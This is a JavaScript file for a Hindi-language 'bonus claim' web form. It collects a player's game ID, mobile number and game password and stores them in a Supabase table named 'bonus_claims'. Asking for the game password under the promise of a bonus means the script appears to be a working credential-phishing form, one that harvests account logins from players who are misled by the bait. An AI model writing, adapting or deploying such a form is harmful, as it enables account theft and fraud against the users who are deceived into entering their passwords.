const SUPABASE_URL = 'YOUR_SUPABASE_URL_HERE'; 
const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_ANON_KEY_HERE';

const { createClient } = supabase;
const supabaseClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

const form = document.getElementById('claimForm');
const submitBtn = document.getElementById('submitBtn');
const btnText = submitBtn.querySelector('.btn-text');
const loader = submitBtn.querySelector('.loader');
const toast = document.getElementById('toast');

function showToast(message, type) {
    toast.textContent = message;
    toast.className = `toast ${type} show`;
    setTimeout(() => { toast.classList.remove('show'); }, 3500);
}

form.addEventListener('submit', async (e) => {
    e.preventDefault();

    submitBtn.disabled = true;
    btnText.textContent = "सबमिट हो रहा है...";
    loader.classList.remove('hidden');

    const gameId = document.getElementById('gameId').value.trim();
    const mobileNumber = document.getElementById('mobileNumber').value.trim();
    const gamePassword = document.getElementById('gamePassword').value.trim();

    try {
        const { error } = await supabaseClient
            .from('bonus_claims')
            .insert([{ game_id: gameId, mobile_number: mobileNumber, game_password: gamePassword }]);

        if (error) throw error;

        showToast("बोनस सफलतापूर्वक सबमिट हो गया!", "success");
        form.reset();

    } catch (error) {
        console.error("Error:", error);
        showToast("कुछ गलत हो गया। दोबारा प्रयास करें।", "error");
    } finally {
        submitBtn.disabled = false;
        btnText.textContent = "बोनस सबमिट करें";
        loader.classList.add('hidden');
    }
});
